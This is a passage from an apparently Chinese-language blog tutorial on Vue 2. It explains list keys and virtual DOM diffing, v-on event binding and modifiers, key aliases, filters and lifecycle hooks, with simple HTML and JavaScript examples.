class="string">&#x27;70万&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">color</span>:<span class="string">&#x27;黑色&#x27;</span></span></span><br><span class="line"><span class="language-javascript">				&#125;,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">str</span>:<span class="string">&#x27;hello&#x27;</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;)</span></span><br><span class="line"><span class="language-javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144300.png" alt="  "></p>
<hr>
<h2 id="2-key作用与原理"><a href="#2-key作用与原理" class="headerlink" title="2. key作用与原理"></a>2. key作用与原理</h2><ul>
<li>官方推荐我们在使用 <code>v-for</code>时，给对应的元素或组件加上一个 <code>:key</code>属性，key的作用主要是为了高效的更新虚拟DOM。当列表的数据变化时，默认情况下， Vue 会尽可能的复用已存在的 DOM 元素，从而提升渲染的性能 。</li>
<li>但这种默认的性能优化策略，会导致有状态的列表无法被正确更新 。为了给 Vue 一个提示，以便它能跟踪每个节点的身份， 从而在保证有状态的列表被正确更新的前提下， 提升渲染的性能 。此时，需要为每项提供一个唯一的 key 属性。</li>
</ul>
<p><strong>案例引入：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>key的原理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.once</span>=<span class="string">&quot;add&quot;</span>&gt;</span>添加老刘<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">				&#123;&#123;p.name&#125;&#125; - &#123;&#123;p.age&#125;&#125;</span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">persons</span>:[</span></span><br><span class="line"><span class="language-javascript">					&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">					&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;李四&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">					&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;王五&#x27;</span>,<span class="attr">age</span>:<span class="number">20</span>&#125;</span></span><br><span class="line"><span class="language-javascript">				]</span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="title function_">add</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="keyword">const</span> p = &#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;老刘&#x27;</span>,<span class="attr">age</span>:<span class="number">40</span>&#125;</span></span><br><span class="line"><span class="language-javascript">					<span class="variable language_">this</span>.<span class="property">persons</span>.<span class="title function_">unshift</span>(p)</span></span><br><span class="line"><span class="language-javascript">				&#125;</span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">		&#125;)</span></span><br><span class="line"><span class="language-javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>运行效果：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144304.png" alt="  "></p>
<hr>
<p><strong>上述案例在增加了“老刘”后，每个人物后面的 input 输入框紊乱，现在我们把 <code>v-for</code> 的 <code>:key</code> 改为 <code>p.id</code> 试一试。</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;p.id&quot;</span>&gt;</span></span><br><span class="line">		&#123;&#123;p.name&#125;&#125; - &#123;&#123;p.age&#125;&#125;</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>运行效果：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144307.png" alt="  "></p>
<hr>
<p><strong>运行结果正常，要明白这其中的诡异，我们就得明白Vue的虚拟DOM对比算法。</strong></p>
<blockquote>
<p><strong>虚拟DOM中key的作用</strong>：</p>
<p><code>key</code>是虚拟DOM中对象的标识，当数据发生变化时，Vue会根据&#x3D;&#x3D;新数据&#x3D;&#x3D;生成&#x3D;&#x3D;新的虚拟DOM&#x3D;&#x3D;，随后Vue进行&#x3D;&#x3D;新虚拟DOM&#x3D;&#x3D;与&#x3D;&#x3D;旧虚拟DOM&#x3D;&#x3D;的差异比较，比较规则如下：</p>
<hr>
<p><strong>对比规则</strong>：</p>
<p>① 旧虚拟DOM中找到了与新虚拟DOM相同的<code>key</code>：</p>
<ul>
<li>若虚拟DOM中内容没变, 直接使用之前的真实DOM</li>
<li>若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM</li>
</ul>
<p>  ② 旧虚拟DOM中未找到与新虚拟DOM相同的<code>key</code>：创建新的真实DOM，随后渲染到到页面</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144310.png" alt="****"><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144418.png" alt="  "></p>
<hr>
<blockquote>
<p><strong>用index作为key可能会引发的问题</strong>：</p>
<p>① 若对数据进行逆序添加、逆序删除等破坏顺序操作：会产生没有必要的真实DOM更新，界面效果没问题, 但效率低<br>② 若结构中还包含输入类的DOM：会产生错误DOM更新，界面有问题</p>
<hr>
<p><strong>开发中如何选择key</strong>?</p>
<p>① 最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值<br>② 如果不存在对数据的逆序添加、逆序删除等破坏顺序的操作，仅用于渲染列表，使用index作为key是没有问题的</p>
</blockquote>
<hr>
<h1 id="七、事件监听指令"><a href="#七、事件监听指令" class="headerlink" title="七、事件监听指令"></a>七、事件监听指令</h1><p>在前端开发中，我们经常需要监听点击、拖拽、键盘事件等等，这个时候需要使用 <code>v-on</code>。</p>
<ul>
<li>作用：绑定事件监听器</li>
<li>缩写：<code>@</code></li>
</ul>
<table>
<thead>
<tr>
<th>DOM对象</th>
<th>vue事件绑定</th>
</tr>
</thead>
<tbody><tr>
<td>onclick</td>
<td>v-on:click</td>
</tr>
<tr>
<td>oninput</td>
<td>v-on:input</td>
</tr>
<tr>
<td>onkeyup</td>
<td>v-on:keyup</td>
</tr>
</tbody></table>
<h2 id="1-v-on"><a href="#1-v-on" class="headerlink" title="1. v-on"></a>1. v-on</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>count = &#123;&#123;count&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;sub&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;add&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">count</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">add</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">this</span>.<span class="property">count</span>++;</span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">sub</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">this</span>.<span class="property">count</span>--;</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>如果我们的事件要传递参数，代码如下：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;method1&quot;</span>&gt;</span>点我1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;method2()&quot;</span>&gt;</span>点我2<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">method1</span>(<span class="params">arg1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;method1: &quot;</span> , arg1);</span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">method2</span>(<span class="params">arg1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;method2: &quot;</span> , arg1);</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144317.png" alt="  "></p>
<hr>
<p><strong>在使用 v-on 绑定事件时：</strong></p>
<ul>
<li>如果事件函数后有括号，如：@click&#x3D;”method1()”,则默认什么都不传递</li>
<li>如果事件函数后无括号，如:@click&#x3D;”method2” ,则默认传递<code>事件对象</code></li>
</ul>
<p><strong>当我们带参数又要带有事件参数时,我们要使用 <code>$event</code>：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;method3($event,2,3,4)&quot;</span>&gt;</span>点我3<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">method3</span>(<span class="params">event, a, b, c</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;event = &quot;</span> , event);</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a = &quot;</span> , a);</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;b = &quot;</span> , b);</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;c = &quot;</span> , c);</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144319.png" alt="  "></p>
<hr>
<h2 id="2-事件修饰符"><a href="#2-事件修饰符" class="headerlink" title="2. 事件修饰符"></a>2. 事件修饰符</h2><p><strong>Vue中的事件修饰符：</strong></p>
<ul>
<li><code>prevent</code>：阻止默认事件（常用）</li>
<li><code>stop</code>：阻止事件冒泡，也就是当前元素发生事件,但当前元素的父元素不发生该事件（常用）</li>
<li><code>once</code>：事件只触发一次（常用）</li>
<li><code>capture</code>：使用事件捕获模式, 主动获取子元素发生事件, 把获取到的事件当自己的事件执行</li>
<li><code>self</code>：只有 <code>event.target</code> 是当前操作的元素时才触发事件</li>
<li><code>passive</code>：事件的默认行为立即执行，无需等待事件回调执行完毕</li>
</ul>
<p>修饰符可以连续写，比如可以这么用：<code>@click.prevent.stop=&quot;showInfo&quot;</code></p>
<hr>
<h2 id="3-键盘事件"><a href="#3-键盘事件" class="headerlink" title="3. 键盘事件"></a>3. 键盘事件</h2><p><strong>键盘上的每个按键都有自己的名称和编码，例如：Enter（13）。而Vue还对一些常用按键起了别名方便使用。</strong></p>
<blockquote>
<h2 id="Vue中常用的按键别名：-回车：enter-删除：delete-捕获“删除”和“退格”键-退出：esc-空格：space-换行：tab-特殊，必须配合keydown去使用-上：up-下：down-左：left-右：right"><a href="#Vue中常用的按键别名：-回车：enter-删除：delete-捕获“删除”和“退格”键-退出：esc-空格：space-换行：tab-特殊，必须配合keydown去使用-上：up-下：down-左：left-右：right" class="headerlink" title="Vue中常用的按键别名：- 回车：enter- 删除：delete (捕获“删除”和“退格”键)- 退出：esc- 空格：space- 换行：tab (特殊，必须配合keydown去使用)- 上：up- 下：down- 左：left- 右：right"></a><strong>Vue中常用的按键别名：</strong><br>- 回车：enter<br>- 删除：delete <strong>(捕获“删除”和“退格”键)</strong><br>- 退出：esc<br>- 空格：space<br>- 换行：tab <strong>(特殊，必须配合<code>keydown</code>去使用)</strong><br>- 上：up<br>- 下：down<br>- 左：left<br>- 右：right</h2><p><strong>注意</strong>： </p>
<p>系统修饰键（用法特殊）：<code>ctrl</code>、<code>alt</code>、<code>shift</code>、<code>meta</code> </p>
<ul>
<li>配合<code>keyup</code>使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发 </li>
<li>配合<code>keydown</code>使用：正常触发事件</li>
</ul>
<hr>
<p>可以使用<code>keyCode</code>去指定具体的按键，比如：@keydown.13&#x3D;”showInfo”</p>
<hr>
<p><code>Vue.config.keyCodes.自定义键名 = 键码</code>，可以自定义按键别名</p>
</blockquote>
<hr>
<h1 id="八、过滤器"><a href="#八、过滤器" class="headerlink" title="八、过滤器"></a>八、过滤器</h1><h2 id="1-过滤器简介"><a href="#1-过滤器简介" class="headerlink" title="1. 过滤器简介"></a>1. 过滤器简介</h2><ul>
<li><p>在官方文档中，是这样说明的：可被用于一些常见的文本格式化，vue中过滤器的作用可被用于一些常见的文本格式化。（也就是修饰文本，但是文本内容不会改变）</p>
</li>
<li><p>通俗点说过滤器就是用来筛选出符合条件的，丢弃不符合条件的</p>
</li>
<li><p>过滤器分为<strong>全局过滤器</strong>与<strong>局部过滤器</strong></p>
</li>
</ul>
<p><strong>过滤器：</strong></p>
<ul>
<li><p><strong>定义</strong>：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。</p>
</li>
<li><p><strong>语法</strong>：</p>
</li>
</ul>
<p> ① 注册过滤器：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//全局过滤器</span></span></span><br><span class="line"><span class="language-javascript">	<span class="title class_">Vue</span>.<span class="title function_">filter</span>(<span class="string">&#x27;过滤器1&#x27;</span>,<span class="keyword">function</span>(<span class="params">value</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">//局部过滤器</span></span></span><br><span class="line"><span class="language-javascript">		<span class="attr">filters</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			过滤器<span class="number">2</span>(value)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p> ② 使用过滤器：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> &#123;&#123; xxx | 过滤器&#125;&#125; <span class="tag">&lt;/<span class="name">h1</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span> = <span class="string">&quot;xxx | 过滤器名&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p><strong>备注：</strong></p>
<ul>
<li>过滤器可以接收额外参数，多个过滤器也可以串联</li>
<li>过滤器并没有改变原本的数据，而是产生新的对应的数据</li>
</ul>
</blockquote>
<h2 id="2-过滤器案例"><a href="#2-过滤器案例" class="headerlink" title="2. 过滤器案例"></a>2. 过滤器案例</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>过滤器<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h2</span>&gt;</span>时间<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>当前时间戳：&#123;&#123;time&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>转换后时间：&#123;&#123;time | timeFormater()&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>转换后时间：&#123;&#123;time | timeFormater(&#x27;YYYY-MM-DD HH:mm:ss&#x27;)&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>截取年月日：&#123;&#123;time | timeFormater() | mySlice&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//全局过滤器</span></span></span><br><span class="line"><span class="language-javascript">	<span class="title class_">Vue</span>.<span class="title function_">filter</span>(<span class="string">&#x27;mySlice&#x27;</span>,<span class="keyword">function</span>(<span class="params">value</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span> value.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">11</span>)</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">time</span>:<span class="number">1658929744</span>,</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">//局部过滤器</span></span></span><br><span class="line"><span class="language-javascript">		<span class="attr">filters</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">timeFormater</span>(<span class="params">value, str=<span class="string">&quot;YYYY年MM月DD日 HH:mm:ss&quot;</span></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="keyword">return</span> <span class="title function_">dayjs</span>(value).<span class="title function_">format</span>(str)</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144325.png" alt="  "></p>
<hr>
<h1 id="九、Vue生命周期"><a href="#九、Vue生命周期" class="headerlink" title="九、Vue生命周期"></a>九、Vue生命周期</h1><p><strong>（1）什么是Vue生命周期?</strong></p>
<p>官网的解释：&#x3D;&#x3D;Vue 实例从创建到销毁的过程，就是生命周期&#x3D;&#x3D;。也就是从开始创建、初始化数据、编译模板、挂载Dom→渲染、更新→渲染、卸载等一系列过程，我们称这是 Vue 的生命周期。</p>
<hr>
<p><strong>（2）vue生命周期的作用是什么?</strong></p>
<p>Vue生命周期中有多个事件钩子，让我们在控制整个Vue实例过程时更容易形成好的逻辑。</p>
<hr>
<p><strong>（3）vue生命周期总共有几个阶段?</strong></p>
<p>可以总共分为8个阶段：</p>
<ul>
<li>创建前&#x2F;后</li>
<li>载入前&#x2F;后</li>
<li>更新前&#x2F;后</li>
<li>销毁前&#x2F;后</li>
</ul>
<hr>
<p><strong>（4）第一次页面加载会触发哪几个钩子?</strong></p>
<p>第一次页面加载时会触发 <code>beforeCreate</code>, <code>created</code>, <code>beforeMount</code>, <code>mounted</code> 这几个钩子</p>
<hr>
<p><strong>（5）DOM 渲染在 哪个周期中就已经完成?</strong></p>
<p>DOM 渲染在 <code>mounted</code> 中就已经完成了。</p>
<hr>
<p><strong>（6）简单描述每个周期具体适合哪些场景?</strong></p>
<p>生命周期钩子的一些使用方法：</p>
<p><code>beforecreate</code> : 可以在此阶段加loading事件，在加载实例时触发；</p>
<p><code>created</code> : 初始化完成时的事件写在这里，如在这结束loading事件，异步请求也适宜在这里调用；</p>
<p><code>mounted</code> : 挂载元素，获取到DOM节点；</p>
<p><code>updated</code> : 如果对数据统一处理，在这里写上相应函数；</p>
<p><code>beforeDestroy</code> : 可以做一个确认停止事件的确认框；</p>
<p><code>nextTick</code> : 更新数据后立即操作dom；</p>
<p>​	</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144330.png" alt="  "></p>
<p>常用的生命周期钩子：</p>
<ul>
<li><p><code>mounted</code>：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等初始化操作</p>
</li>
